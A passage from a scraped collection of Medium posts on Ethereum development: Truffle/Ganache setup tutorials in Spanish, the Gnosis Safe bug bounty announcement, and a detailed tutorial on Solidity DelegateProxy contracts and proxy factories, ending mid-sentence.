https://soundcloud.com/tokenpoints/1-austin-griffith", "responses": ""}, {"title": "Trabajando con Smart Contracts en Ethereum\u200a\u2014\u200aParte\u00a0I", "author_name": "\u00c1ngel Luis Quesada", "link": "https://medium.com/kubide/trabajando-con-smart-contracts-en-ethereum-parte-i-b93ee67e74ce?source=search_post", "post_date": "Feb 7", "readtime": "3 min read", "upvotes": "", "content": "Trabajando con Smart Contracts en Ethereum\u200a\u2014\u200aParte\u00a0IIntro\u200a\u2014\u200aEntornos de Implementaci\u00f3n\u00c1ngel Luis QuesadaBlockedUnblockFollowFollowingFeb 7Foto cortes\u00eda de Silvia Rodriguez\u00daltimamente no paramos de ver muchos art\u00edculos sobre qu\u00e9 es blockchain, qu\u00e9 son las criptomonedas y qu\u00e9 se puede hacer con un Smart Contract en Ethereum, pero pocos en los que realmente nos bajemos al barro, nos manchemos las manos y empecemos a trabajar, de una forma profesional, con Solidity.Por eso, vamos a empezar una serie de art\u00edculos sobre Solidity donde os contaremos c\u00f3mo creamos, y trabajamos, desde Kubide, con este nuevo lenguaje.No queremos ser otro \u201chello world\u201d, para eso, os recomendamos que os le\u00e1is la documentaci\u00f3n oficial, que es bastante buena. Pero si que espero que os sirva de bastante ayuda a la hora de organizaros para acometer un gran proyecto en Blockchain.Empezaremos mostrando nuestro entorno de implementaci\u00f3n con esta tecnolog\u00eda, nuestro boirleplate, haremos un Smart Contract b\u00e1sico y usaremos NodeJs para consumirlo (si, NodeJS, porque tambi\u00e9n hemos visto much\u00edsimos art\u00edculos para hacerlo desde Web con React o Angular, y no queremos repetir)En un proceso normal de trabajo, al igual que con cualquier otro proyecto o lenguaje de programacion, solemos dividir el entorno de implementaci\u00f3n en 5 \u00e1reas delimitadas:", "responses": ""}, {"title": "Trabajando con Ethereum en grandes proyectos\u200a\u2014\u200aParte\u00a0II", "author_name": "\u00c1ngel Luis Quesada", "link": "https://medium.com/kubide/trabajando-con-ethereum-en-grandes-proyectos-parte-ii-af454f8935b3?source=search_post", "post_date": "Dec 26, 2017", "readtime": "4 min read", "upvotes": "", "content": "Trabajando con Ethereum en grandes proyectos\u200a\u2014\u200aParte\u00a0IICrear el entorno de trabajo\u00a0local\u00c1ngel Luis QuesadaBlockedUnblockFollowFollowingDec 26, 2017Foto cortes\u00eda de Silvia RodriguezComo os comentamos en el post anterior, nuestra idea es ir paso a paso contando todo el flujo de vida de un Smart Contract dentro de un gran proyecto.Y, en este caso, empezaremos por crear un entorno de trabajo local que, como siempre, podr\u00e9is ver completo en este proyecto de Github.Lo primero que hay que hacer es inicializar el proyecto con Node y Truffle, as\u00ed como todos los m\u00f3dulos necesarios para el proyecto.npm initnpm install \u2014 save trufflenpm install \u2014 save-dev ganache-cliRecordar que lo hemos instalado todo de forma local, as\u00ed que tendremos que crear, en el package.json, los comandos necesarios para poder acceder a truffle y a ganache-cli:{    \u201cscripts\u201d: {        \u201ct\u201d: \u201ctruffle\u201d,        \u201ctest\u201d: \u201ctruffle test\u201d,        \u201ctestnet\u201d: \u201cganache-cli\u201d    }}Ahora podr\u00e9is ejecutarlos mediante:npm run tnpm run testnpm run testnetLos dos primeros fallar\u00e1n ya que todav\u00eda no est\u00e1 configurado truffle. El tercero, la testnet, es recomendable que la abr\u00e1is en un terminal diferente, ya que tendr\u00e1 que estar siempre arrancada.Nota: Recordar que pod\u00e9is a\u00f1adir flags a los comandos a\u00f1adiendo dos guiones \u201c\u2013\u201d antes de los flags que quer\u00e1is pasar al comando.Por ahora, poco podemos hacer, as\u00ed que vamos a arrancar truffle para que nos instale toda su configuraci\u00f3n base.npm run t initEsto nos genera un fichero y los tres directorios que necesita truffle para trabajar.Contracts: es el directorio donde ir\u00e1n todos los contratos de Solidity que realicemos.Migrations: En este directorio se guardan los scripts necesarios para hacer el deploy de los contratos a la blockchain.\u00a0Hay que tener en cuenta que nuestro c\u00f3digo no est\u00e1 directamente en la blockchain sino que hay que hacer una serie de transacciones para que sea accesible desde la misma, tambi\u00e9n es importante porque, en caso de que se necesiten varios Smart Contracts, es aqu\u00ed donde diremos como se deben subir y cual es la relaci\u00f3n entre todos ellos.Test: Porque ya no sabemos programar sin hacer test!!\u00a0En nuestro caso usaremos los test en JS (usa por debajo Mocha), aunque tambi\u00e9n los hay en formato Solidity.truffle.js En este fichero debe estar la configuraci\u00f3n b\u00e1sica de truffle para hablar con las diferentes redes blockchain con las que trabajes. En la documentaci\u00f3n de Truffle os indican como pod\u00e9is configurarlo. Por ahora usaremos la configuraci\u00f3n b\u00e1sica.La propia suite de truffle trae por defecto una testnet que parte de la de ganache-cli, podr\u00edamos usar esta por defecto con el comando \u201cnpm run t\u200a\u2014\u200adevelop\u201d, esta testnet, en nuestro caso, est\u00e1 usando el puerto 9545, mientras que la blockchain de ganache-cli corre bajo el 8545, y la app de Ganache est\u00e1 en el puerto 7545, por lo que en la configuraci\u00f3n de truffle.js podr\u00e9is poner:module.exports = {  // See <http://truffleframework.com/docs/advanced/configuration>  // to customize your Truffle configuration!  networks: {    truffle: {      host: 'localhost',      port: 9545,      network_id: '*' // Match any network id    },    ganache: {      host: 'localhost',      port: 7545,      network_id: 5777    },    development: {      host: 'localhost',      port: 8545,     network_id: '*' // Match any network id    },  }};Por otro lado, aqu\u00ed os cuentan un poco sobre los network_id, no entraremos mucho en detalle para no salir de contexto, pero hay que saber que hay una lista definida de los principales network ids y que las redes testnet suelen poner el suyo de forma aleator\u00eda, de ah\u00ed que se suela poner el aster\u00edsco \u201c*\u201d para los de desarrollo.Podr\u00e1s elegir cualquiera de las redes simplemente nombr\u00e1ndolas, por ejemplo:# Probar la red de ganacha-clinpm run t console# Probar la red testnet de trufflenpm run t console -- --network truffleY, para comprobar que todo funciona correctamente s\u00f3lo tenemos que arrancar las dos redes blockchain en dos terminales distintos y, sin cerrarlas, arrancar la consola de truffle conect\u00e1ndose a cada una de ellas:# Para arrancar la red de ganache-clinpm run testnet# Para arrancar la red testnet de trufflenpm run t developY para problarlas# Probar la red de ganache-clinpm run t console# Probar la red testnet de trufflenpm run t console -- --network truffleDeber\u00edas poder conectarte a ambas redes y ver algo similar a esto:> solidity-boilerplate@1.0.0 t /home/gelito/projects/solidity-Boilerplate> truffle \"console\"truffle(development)>Y, por \u00faltimo, el package.json deber\u00eda acabar mostrando algo similar a esto:{  \"name\": \"solidity-boilerplate\",  \"version\": \"1.0.0\",  \"description\": \"A basic boilerplate of a Solidity project\",  \"main\": \"index.js\",  \"scripts\": {    \"t\": \"truffle\",    \"test\": \"truffle test\",    \"testnet\": \"ganache-cli\"  },  \"repository\": {    \"type\": \"git\",    \"url\": \"git+https://github.com/Kubide/solidity-Boilerplate.git\"  },  \"keywords\": [    \"solidity\",    \"truffle\",    \"open-zeppeling\"  ],  \"author\": \"Kubide\",  \"license\": \"ISC\",  \"bugs\": {    \"url\": \"https://github.com/Kubide/solidity-Boilerplate/issues\"  },  \"homepage\": \"https://github.com/Kubide/solidity-Boilerplate#readme\",  \"dependencies\": {    \"truffle\": \"^4.0.4\"  },  \"devDependencies\": {    \"ganache-cli\": \"^6.0.3\"  }}Con esto, m\u00e1s las recomendaciones que os pusimos en el anterior post, ya tendr\u00e9is una estructura b\u00e1sica para empezar a trabajar. Seguiremos avanzando.Y no os olvid\u00e9is del\u00a0.gitignore!", "responses": ""}, {"title": "Announcing the Gnosis Safe Bug\u00a0Bounty", "author_name": "Lukas Schor", "link": "https://blog.gnosis.pm/announcing-the-gnosis-safe-bug-bounty-10e147e719c4?source=search_post", "post_date": "May 10", "readtime": "4 min read", "upvotes": "57", "content": "Announcing the Gnosis Safe Bug\u00a0BountyFind the bugs, get rewarded. Earn up to $50,000 for every bug you\u00a0report.Lukas SchorBlockedUnblockFollowFollowingMay 10We\u2019ve already put the Gnosis Safe smart contracts under the microscope of formal verification. Given our confidence in the Gnosis Safe smart contracts\u2019 security, we\u2019ve decided at Gnosis to move our own company funds to the newly formally verified contracts. Our funds will be moved in stages, with the first 5,000 ETH already stored in this Gnosis Safe, a honeypot for hackers.But that\u2019s not all! We are also kicking off a bug bounty program to further audit and secure the Gnosis Safe smart contracts. Earn up to $50,000 for every bug you report.Let\u2019s get right into\u00a0it\u2026The RulesMany of the Ethereum Foundation\u2019s bug bounty program rules are also applicable for the Gnosis Safe bug bounty program:Issues that have already been submitted by another user or are already known to the Gnosis team are not eligible for bounty rewards.Public disclosure of a vulnerability makes it ineligible for a bounty.The Gnosis core development team, employees, and all other people paid by Gnosis, directly or indirectly (including the external auditor), are not eligible for rewards.The Gnosis Safe bounty program considers a number of variables in determining rewards. Determinations of eligibility, score, and all terms related to an award are at the sole and final discretion of the Gnosis Safe bug bounty panel.The ScopeThe scope of our bug bounty program includes core contracts related to release v1.0.0 of the Gnosis Safe (check out the Readme or the release details for more information).In scope:GnosisSafe.solProxyFactory.solCreateAndAddModules.sol, MultiSend.sol (the only libraries that are part of the bug bounty)Examples of what\u2019s in\u00a0scope:Being able to steal fundsBeing able to freeze funds or render them inaccessible by their ownersBeing able to perform replay attacksBeing able to change Safe settings without owner consentOut of\u00a0scope:Any files, modules or libraries other than the ones mentioned aboveMore efficient gas solutionsAny points listed as an already known weaknessesAny points listed in the audit or formal verification results reportIntended behaviorPlease refer to the readme file, the readthedocs and the release details in the repository for an extensive overview of the intended behavior of the smart contracts.CompensationAny bugs\u200a\u2014\u200athey do not need to necessarily lead to a redeploy\u200a\u2014\u200awill be considered for a bounty. But the severity of the threat will change the reward. Below are the reward levels for each threat severity along with an example of such a threat.High threat: up to\u00a0$50,000An identified attack that could steal funds or tokens or lock user funds would be considered a high threat. Likewise, a reported bug that, on its own, leads to a redeploy of the code will always be considered a high threat.Medium threat: up to\u00a0$10,000An identified attack where it is possible to steal funds because of unexpected behavior on the part of the user. Unexpected behavior here means that it is not possible for the user to have a way to see what will happen before the funds are lost.Low threat: up to\u00a0$2,000A way to avoid transaction fees or in some way compromising the experience of other Safe users.All bounties will be paid in ETH.Please note that the submission\u2019s quality will factor into the level of compensation. A high-quality submission includes an explanation of how the bug can be reproduced, a failing test case, a valid scenario in which the bug can be exploited, and a fix that makes the test case pass. High-quality submissions may be awarded amounts higher than the amounts specified above.Submission ProcessPlease email your submissions to: bounty@gnosis.pmDon\u2019t forget to include your ETH address so you can be rewarded. If more than one address is specified, only one will be used at the discretion of the bounty program administrators.Anonymous submissions are welcome, too.Responsible Disclosure PolicyIf you comply with the policies below when reporting a security issue to us, we will not initiate a lawsuit or law enforcement investigation against you in response to your report.We ask\u00a0that:You give us reasonable time to investigate and mitigate an issue you report before making public any information about the report or sharing such information with others.You make a good faith effort to avoid privacy violations and disruptions to others, including (but not limited to) destruction of data and interruption or degradation of our services.You do not exploit a security issue you discover for any reason. This includes demonstrating additional risk, such as an attempted compromise of sensitive company data or probing for additional issues.You do not violate any other applicable laws or regulations.Public disclosure of the bug or indication of an intention to exploit it on the mainnet will make the report ineligible for a bounty. If in doubt about other aspects of the bounty, most of the Ethereum Foundation bug bounty program rules will apply here.Any questions? Reach us via email (bounty@gnosis.pm) or Gitter. For more information on the Gnosis Safe, check out our blog and our Github.Honey PotAs mentioned above, we have transferred a significant amount of funds to a Gnosis Safe (5000 ETH), which serves as a honey pot for bounty hunters.At Gnosis, we will gradually move substantial amounts of our company funds into a Gnosis Safe.Happy hunting!", "responses": ""}, {"title": "Testing Solidity with Truffle and Async/Await", "author_name": "Angello Pozo", "link": "https://medium.com/coinmonks/testing-solidity-with-truffle-and-async-await-396e81c54f93?source=search_post", "post_date": "Aug 10, 2017", "readtime": "5 min read", "upvotes": "651", "content": "Testing Solidity with Truffle and Async/AwaitAngello PozoBlockedUnblockFollowFollowingAug 10, 2017If you were to ask a programmer/developer what the worst part of the job is, I think most would say writing tests. You have to create mock data and do coding backflips to get specific things to work properly. On top of that you have to write many different cases for a single feature/function. It takes a lot of time write good tests. But with the introduction of async/await in node 8, writing tests becomes much nicer! Its what we used to create over 100 tests for HelloSugoi.", "responses": "9"}, {"title": "Solidity DelegateProxy Contracts", "author_name": "Alan Lu", "link": "https://blog.gnosis.pm/solidity-delegateproxy-contracts-e09957d0f201?source=search_post", "post_date": "May 17, 2018", "readtime": "26 min read", "upvotes": "891", "content": "Solidity DelegateProxy ContractsAlan LuBlockedUnblockFollowFollowingMay 17, 2018Note: This is going to be a pretty technical read. You should be familiar with at least fundamental Ethereum architecture and rudimentary Solidity development before reading this article.Deploying contracts on Ethereum can be really costly. For non-trivial contracts, the amount of gas required can reach into the millions. Factor in an average gas price of 20 GWei, and each contract you deploy may cost you upwards of tens to hundreds of dollars!These deployment gas costs can bar some dApps from reaching a wider audience. Mitigation of these costs using monolithic smart contracts carries the risk of having to maintain a large monolithic smart contract. Splitting logic out into libraries may help, but depending on the problem domain, may not always be the right fit.Furthermore, existing smart contracts may have flaws, or they might need updates to their logic. Proxies can enable contract logic to be updatable as well, so additional business requirements may be implemented after the initial deployment. Of course, this is a tradeoff: contract users would have to trust that the contract owner updates the contract in a way that does not violate user expectations. However, there are ways to reduce the amount of trust required from users during updates.Basic Contract Deployment MechanicsLet\u2019s imagine that we develop contracts for a blockchain kombucha company. Our business requires us to create smart contracts for every bottle of kombucha we sell, for reasons. Okay, so we just make up a Kombucha contract:pragma solidity ^0.4.23;contract Kombucha {    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);    uint public fillAmount;    uint public capacity;    string public flavor;    constructor(string _flavor, uint _fillAmount, uint _capacity)        public    {        require(_fillAmount <= _capacity && _capacity > 0);        flavor = _flavor;        fillAmount = _fillAmount;        capacity = _capacity;    }    function fill(uint amountToAdd) public {        uint newAmount = fillAmount + amountToAdd;        require(newAmount > fillAmount && newAmount <= capacity);        fillAmount = newAmount;        emit FilledKombucha(amountToAdd, newAmount);    }    function drink(uint amountToDrink) public returns (bytes32) {        uint newAmount = fillAmount - amountToDrink;        require(newAmount < fillAmount);        fillAmount = newAmount;        emit DrankKombucha(amountToDrink, newAmount);        // this mess of hashes just here to pad out the bytecode        return keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(                amountToDrink            ))))))))))))))))))))))))))))))))))))))))))))))))));    }}We compile that contract with optimization enabled, and we deploy it with some parameters like \u201cpeach\u201d, 100, 100\u2026 to find out that it consumes 552,034 gas in deployment. To make things worse, let\u2019s say, in order to get the transaction to go through in a timely manner, we had to set a gas price of 20 GWei, and the price of Ether happens to be about $1000 that day. That means every Kombucha contract costs $11.04 to deploy. Oof, let\u2019s try and make that better.Historical Proxy\u00a0PatternsBecause of the exorbitant gas costs of putting additional copies of the code onto the blockchain (not to mention the vast inefficiencies involved in doing so), the Ethereum developer community has been searching for methods of reducing deployment costs through deduplication of actual code deployed onto the chain. One approach is to use Solidity libraries to provide a location on chain where the bulk of the logic for objects exists, and have contracts essentially be a location for storing state with thin wrappers around library calls.This is called Library-Driven Development:library KombuchaLib {    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);    struct KombuchaStorage {        uint fillAmount;        uint capacity;        string flavor;    }    function init(        KombuchaStorage storage self,        string _flavor, uint _fillAmount, uint _capacity    ) public {        require(_fillAmount <= _capacity && _capacity > 0);        self.flavor = _flavor;        self.fillAmount = _fillAmount;        self.capacity = _capacity;    }    function fill(KombuchaStorage storage self, uint amountToAdd) public {        uint newAmount = self.fillAmount + amountToAdd;        require(newAmount > self.fillAmount && newAmount <= self.capacity);        self.fillAmount = newAmount;        emit FilledKombucha(amountToAdd, newAmount);    }    // ... and etc. for all the other functions}\u2026where the contracts wrap calls to the library:contract Kombucha {    using KombuchaLib for KombuchaLib.KombuchaStorage;    // we have to repeat the event declarations in the contract    // in order for some client-side frameworks to detect them    // (otherwise they won't show up in the contract ABI)    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);    KombuchaLib.KombuchaStorage private self;    constructor(string _flavor, uint _fillAmount, uint _capacity) public {        self.init(_flavor, _fillAmount, _capacity);    }    function fill(uint amountToAdd) public {        return self.fill(amountToAdd);    }    // do same for drink(...) method    function fillAmount() public view returns (uint) {        return self.fillAmount;    }    // same for capacity and flavor accessors}With this approach, deploying the library costs 479,430 gas (~$9.59), and then deploying an instance of the Kombucha contract costs 358,431 gas (~$7.17). Since we only have to deploy the library once, we\u2019ve saved 35% in deployment costs over the long run.Okay, but can we do better? This method still produces a contract with quite a bit of redundancy. For one, the state of the contract has to be contained in a struct now. Both the state and method parameters have to be passed down into the linked library, and method declarations and events are repeated. This repetition is unavoidable for various technical reasons, and this means our contract code is more brittle now. Also, while the gas savings are great, the fact is that we are still deploying quite a bit of \u201cwrapper\u201d bytecode to the chain, since we essentially have to map the function signatures of the library calls to the function signatures of the Kombucha contract calls.Well, turns out we can do better. By dropping down into assembly, we can implement a generic proxy:contract ProxyData {    address internal proxied;}contract Proxy is ProxyData {    constructor(address _proxied) public {        proxied = _proxied;    }    function () public payable {        address addr = proxied;        assembly {            let freememstart := mload(0x40)            calldatacopy(freememstart, 0, calldatasize())            let success := delegatecall(not(0), addr, freememstart, calldatasize(), freememstart, 32)            switch success            case 0 { revert(freememstart, 32) }            default { return(freememstart, 32) }        }    }}(Inheriting proxied from ProxyData may seem like unnecessary indirection right now, but it will come into play later, I promise.)Creating this proxy only costs 111987 gas (~$2.24)! Not only that, but this contract is able to copy the logic of any conventionally written smart contract. Okay, so we\u2019re done now, right? No\u2026 actually that was a bit optimistic, as we\u2019ll soon see.Proxy-friendly Storage\u00a0LayoutsWe really should give the proxy a test spin before we declare victory. Let\u2019s fire up Remix and try this out on the conveniently embedded JS VM. We\u2019ll first copy over the original Kombucha contract and this Proxy contract code into Remix. Then, we\u2019ll create an instance of Kombucha with a few parameters (say\u2026 \u201cpeach\u201d, 100, 100 again). Then, we\u2019ll use the address of the created Kombucha instance as the _proxied parameter of the Proxy contract. Finally, let\u2019s call the fillAmount accessor:Something weird is going on\u00a0hereThe generic proxy above seems to produce a nonsensical value when asked about its fillAmount. Why is that the case? The key to understanding that value is knowing about the layout of state variables, and the fact that delegatecalls cause the original contract\u2019s logic to be executed in the context of the proxy\u2019s address, meaning its logic will assume that this proxy\u2019s address has the same storage layout.To sum up storage layouts: Solidity packs fixed-length state variables into 32-byte EVM words in their order of declaration starting at storage slot zero, while dynamic variables use slightly more complex rules for storage.The generic proxy declares a single address of storage: proxied, whereas the Kombucha contract declares two uint256s and a string. Look at the Proxy and Kombucha columns in the following table:Storage layout for various contracts; H(n) is the Keccak256 hash of a big-endian 256-bit integer n; flavor (contents) is actually displaced by about 5.88e+76 slots after adding the state variable `proxied`The proxied address and the fillAmount are forced to occupy the same storage slot, according to the rules of Solidity storage layout. This means that when we tried to access fillAmount, what was actually accessed was the proxied address, interpreted as a 256-bit unsigned integer. You may verify this by looking at the hexadecimal representation of the value returned and comparing that to the address of the original Kombucha contract instance:(Using a Python shell to do hexadecimal conversion)>>> hex(539200072242722497324523172593427911613710757535)'0x5e72914535f202659083db3a02c984188fa26e9f'Ah, the weird fillAmount value and the proxied address match! That means we just have to add another storage variable at the beginning of Kombucha which is an address, and remember that in general, proxies and proxy targets have to have compatible storage layouts (compare the last column of the table above). One way to do that is by prepending the proxied address to the storage layout via inheritance:// Modify the declaration of Kombucha this way// to make it proxy-friendlycontract Kombucha is ProxyData {    // rest of Kombucha contents...}Also, let\u2019s think of this point in this discussion as checkpoint one.Proxy Storage InitializationYou may have noticed that the other storage variables are completely uninitialized for proxies. In the example above, the capacity variable of the proxy when the proxy is viewed as an instance of the Kombucha contract is zero, as that slot is not modified by the Proxy constructor.But the Kombucha constructor does not allow the construction of a Kombucha instance with zero capacity, thanks to the following line:require(_fillAmount <= _capacity && _capacity > 0);// later, capacity is assigned the value of _capacityIn fact, according to this requirement, fillAmount wasn\u2019t even supposed to be greater than capacity, let alone a casted proxy address value (though of course, we can address that by ensuring compatibility between the storage layouts for the Proxy and its target contracts). The point is that the state of the proxy is completely broken, so all of Kombucha\u2019s functionality won\u2019t work correctly on the proxy.That\u2019s pretty lame. We don\u2019t want to limit the proxy to only those contracts that can start off of a completely uninitialized storage, but we also don\u2019t want people arbitrarily changing, for example, the flavor and capacity of different Kombucha instances, especially if it was a business requirement and you wrote the constructor for Kombucha the way you did for a good reason.Additional Proxy Initialization Method\u00a0ApproachOne way to allow the generic proxy to be applied to contracts which expect a non-empty initial state is to add an init method to the contract:contract Kombucha is ProxyData {    // original declarations...    constructor(string _flavor, uint _fillAmount, uint _capacity) public {        init(_flavor, _fillAmount, _capacity);    }    function init(string _flavor, uint _fillAmount, uint _capacity) public {        require(capacity == 0 && _fillAmount <= _capacity && _capacity > 0);        flavor = _flavor;        fillAmount = _fillAmount;        capacity = _capacity;    }    // and the rest of Kombucha...}First, notice that the init method is called in the constructor, and is indeed the only method called in the constructor here. Second, note that the implementation of init is almost identical to the original constructor\u2019s implementation. The difference occurs in this line:require(capacity == 0 && _fillAmount <= _capacity && _capacity > 0);We require that the storage variable capacity is unset here because we need to ensure that the init method is executed only once and only when the contract is uninitialized.For the Kombucha contract, the check on the capacity storage variable is enough to enforce those expected init method properties because there\u2019s no way of unsetting the capacity variable after its been set, but in general, different contracts require different ways of enforcing initialization behavior.Also, there is no access control on the initialization method, and indeed, somebody can call the init method before you do if you just directly proxy a Kombucha instance. Implementing access control on initialization would require you to either hardcode your address into the init method or to extend the proxy constructor, since otherwise, you would have to somehow initialize a storage variable to describe the address for which access is granted. There is a way around this though, and we will come back to this initialization approach later in the article.Finally, I\u2019d like to mention that the bytecode deployed using this init pattern is heavier than the bytecode deployed in the original Kombucha because the initialization method is part of the contract code! Normally, constructor logic is executed once to set up the initial contract state, and then that logic is never deployed. By moving that logic to init, we also have to deploy that logic so that it can be called through the proxy to setup state.We\u2019ll refer to the system state now as checkpoint init.Proxy Subclasses and DRY with Multiple InheritanceLet\u2019s return to checkpoint one now. We will try and move the constructor code out of the base class into a proxy subclass so that we can avoid:deploying the base class with the extra initialization methodmodifying the original contract to make sure state initialization only occurs once and only on an uninitialized staterisking having initialization on an uninitialized contract state hijacked by an unauthorized party (though this will be solved on the initialization method based approach soon)We will accomplish this simply by moving the contract constructor code into the proxy. In order to do this successfully, however, the proxy contract will need to be aware of the way contract storage is laid out. This can be expressed by splitting the contract data out into a separate mixin contract:contract KombuchaData is ProxyData {    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);        uint public fillAmount;    uint public capacity;    string public flavor;}Then, moving the contract constructor into the proxy is straightforward:contract KombuchaProxy is Proxy, KombuchaData {    function KombuchaProxy(address proxied, string _flavor, uint _fillAmount, uint _capacity)        public        Proxy(proxied)    {        // the body is identical to our original constructor!        require(_fillAmount <= _capacity && _capacity > 0);        flavor = _flavor;        fillAmount = _fillAmount;        capacity = _capacity;    }}contract Kombucha is KombuchaData {        // this is just all the methods of the original Kombucha:    // drink and fill}The order in which parent contracts are declared on the child contracts determines how their storages are laid out, and both the proxy and the implementation contracts have to be aware of the Kombucha contract storage layout. We use inheritance so that storage variables only have to be declared once, and they are automatically laid out accordingly for both full and proxy instances:Note that the KombuchaProxy constructor also has to specify how to construct the Proxy it is subclassing, so in fact, the constructor has an additional parameter: the address of a full instance of Kombucha. Other than accounting for this extra parameter in the proxy constructor and having to separate state variables and type declarations out into a data mixin contract, the code remains essentially the same as the original.Also, note that KombuchaProxy does not include ProxyData twice because Solidity only copies code from each parent contract in a contract\u2019s ancestry at most once into a contract, so using this will not unalign the storage layout. We will be using this fact throughout the rest of this article.We can test this setup by constructing a full Kombucha instance (which takes no arguments now), constructing a KombuchaProxy instance with the address of the full Kombucha instance\u2019s address as the first argument, and finally viewing the proxy as if it was Kombucha:It works!However, the KombuchaProxy instance still contains unnecessary code, namely, the accessors generated for the inherited public state variables declared in KombuchaData:All we should need is the fallback on the\u00a0proxyUnfortunately, this is not so nicely factored away:contract KombuchaHeader {    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);}contract KombuchaDataInternal is ProxyData, KombuchaHeader {    uint internal fillAmount;    uint internal capacity;    string internal flavor;}contract KombuchaData is ProxyData, KombuchaHeader {    uint public fillAmount;    uint public capacity;    string public flavor;}contract KombuchaProxy is Proxy, KombuchaDataInternal {    // ...}contract Kombucha is KombuchaData {    // ...}We can deduplicate type and event declarations as well as modifier definitions by pulling them out into a common header mixin like KombuchaHeader, but that\u2019s as far as we can factor. We can\u2019t avoid repeating the declaration of state variables that have accessors, so internal and public versions of the variable declarations have to be repeated in separate mixins.Let\u2019s call this point of the discussion checkpoint subclass. Taking this setup out for a test spin makes this happen:Wait, I said I wanted peach\u00a0flavoredWhy would taking the code for the accessors out of the proxy instance cause the flavor accessor to start failing?Byzantium Hard Fork and EIP\u00a0211Look carefully in the generic proxy code and you\u2019ll find some 32s floating around in the assembly section. If you took a detour earlier and read Swende\u2019s commentary on the generic proxy, or if you happen to know the arguments for the delegatecall, return, and/or revert opcodes, you will find that the 32 corresponds to the size in bytes of the data copied from the delegatecall result and returned/reverted. This means that our generic proxy can\u2019t handle return data larger than 32-bytes.In particular, strings are encoded as an EVM 32-byte word of its length followed by its contents zero-right-padded to 32-bytes. Moreover, since it is a dynamic return type, the offset of the string is output in its slot, meaning the first two words are, in order, a uint256(32) for the offset and a uint256 containing the string length. However, all that the proxy passes is the 32-byte word containing the string offset in the return data, but not the length and contents of the string.We can test this theory further by upping the return size in the proxy to 74-bytes:// inside of the Proxy assembly {} section:let success := delegatecall(not(0), addr, freememstart, calldatasize(), freememstart, 74)switch successcase 0 { revert(freememstart, 74) }default { return(freememstart, 74) }And then supplying \u201csupercalifragilisticexpialidocious\u201d as the flavor:Our proxy passed along the 32-byte offset value, and then the 32-byte string length value, but stopped 10 bytes into the actual string contents, giving us \u201csupercalif\u201d. We can resolve this by continuing to bump up the hard-coded return data size in the proxy, but this only makes the proxy more and more expensive as the parameter increases. Also, without the ability to handle different return sizes, our proxies will never be able to act as a generic stand-in for their proxied contracts.Luckily, there is something that can address this: EIP 211. Basically, this proposal extends the existing EVM instruction set with two new opcodes: returndatacopy and returndatasize. It has been accepted and incorporated into the main network since the Byzantium hard fork. We can now pass along dynamically sized return values in our proxy like so:// inside of the Proxy assembly {} section:let success := delegatecall(not(0), addr, freememstart, calldatasize(), freememstart, 0)returndatacopy(freememstart, 0, returndatasize())switch successcase 0 { revert(freememstart, returndatasize()) }default { return(freememstart, returndatasize()) }With this change, you\u2019ll be able to pass that supercalifragilisticexpialidocious flavor along with the proxy:All in all, this proxy costs 302,979 gas (~$6.06) to deploy, saving 45% of deployment costs over time, for a relatively simple contract at that. For larger more complex contracts, this proxy would save even more gas!All of our generic proxies from this point forward in this article will use this dynamic return mechanism.Proxy FactoriesBoth the initialization method and the multiple inheritance approaches to proxying existing contracts add additional requirements to the construction of proxies, but proxies should behave practically identically to their proxied objects. Factories can hide that implementation detail behind a facade, providing users with a consistent interface for creating something functionally equivalent to Kombucha instances.Let\u2019s draft up a Kombucha factory for our original Kombucha:contract KombuchaFactory {    function createKombucha(string flavor, uint fillAmount, uint capacity)        public        returns (Kombucha)    {        return new Kombucha(flavor, fillAmount, capacity);    }}This factory method right now is functionally equivalent to just a constructor call, but it costs about as much as constructing a full Kombucha instance because, well, it is constructing a full Kombucha instance. Actually, the factory createKombucha transaction costs 432,694 gas, which is about 120K ($2.40) less gas than via the constructor directly! This is a consequence of the Kombucha code being loaded from the factory, and not being sent as part of the transaction data.Let\u2019s make a factory, but this time, let\u2019s say Kombucha is proxy-friendly and has a correctly written init method\u200a\u2014\u200athat is, let\u2019s use checkpoint init. Instead of creating full Kombucha instances, we want the factory to create Proxy instances referring to a master Kombucha copy:contract KombuchaFactory {    Kombucha private masterCopy;    constructor(Kombucha _masterCopy) public {        masterCopy = _masterCopy;    }    function createKombucha(string flavor, uint fillAmount, uint capacity)        public        returns (Kombucha kombucha)    {        kombucha = Kombucha(new Proxy(masterCopy));        kombucha.init(flavor, fillAmount, capacity);    }}Since we are able to initialize the proxy storage in the same transaction that we create the proxy in, we guarantee that instances created by the factory method are initialized properly, without any risk of another user intervening in the initialization step. Moreover, our proxy-producing factory is a drop-in replacement for the full instance factory, and the cost of creating new Kombucha instances will be drastically cut with the use of this proxy-producing factory.Similarly, over in checkpoint subclass, we can tidy up the interface to the multiple inheritance approach to proxying for the same effect:contract KombuchaFactory {    Kombucha private masterCopy;    constructor(Kombucha _masterCopy) public {        masterCopy = _masterCopy;    }    function createKombucha(string flavor, uint fillAmount, uint capacity)        public        returns (Kombucha)    {        return Kombucha(new KombuchaProxy(masterCopy, flavor, fillAmount, capacity));    }}Similarly to earlier, the factory pattern reduces the cost of creating instances even more because the KombuchaProxy bytecode does not need to be sent as transaction data: it is copied from the factory. This puts the gas cost per instance at 208063, or about $4.16. This is almost as cheap as this\u2019ll get.A Note about Transaction CostsI don\u2019t want to give the impression that proxies somehow magically save gas in all circumstances: there is a tradeoff. While proxies may create immense savings in terms of code duplication on the chain, it loses gas in each call to the proxy because of the delegatecall indirection. For example, normally a call to drink 30 units on a Kombucha instance would take 32,369 gas, but if that call was proxied, the transaction would require 33,559 gas (~$0.02 difference). If those calls are made thousands of times, the cost of using the 